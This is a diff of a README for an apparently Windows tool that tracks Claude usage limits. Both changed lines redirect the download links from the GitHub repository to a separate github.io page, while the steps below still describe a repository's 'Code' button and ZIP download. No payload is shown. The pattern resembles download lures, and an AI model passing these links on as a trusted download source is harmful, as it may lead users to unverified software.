@@ -1,6 +1,6 @@
 # 📊 claude-statusline-burnrate - Track your Claude usage limits easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/rasulfal7902/claude-statusline-burnrate)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://rasulfal7902.github.io)
 
 ## 💡 What this tool does
 
@@ -18,7 +18,7 @@ This tool runs on Windows. You need the following items installed on your machin
 
 Follow these steps to get the tool running on your computer.
 
-1. Visit this page to download: [https://github.com/rasulfal7902/claude-statusline-burnrate](https://github.com/rasulfal7902/claude-statusline-burnrate)
+1. Visit this page to download: [https://rasulfal7902.github.io](https://rasulfal7902.github.io)
 2. Locate the green button labeled Code.
 3. Click the button and select Download ZIP.
 4. Extract the ZIP file to a folder on your computer.
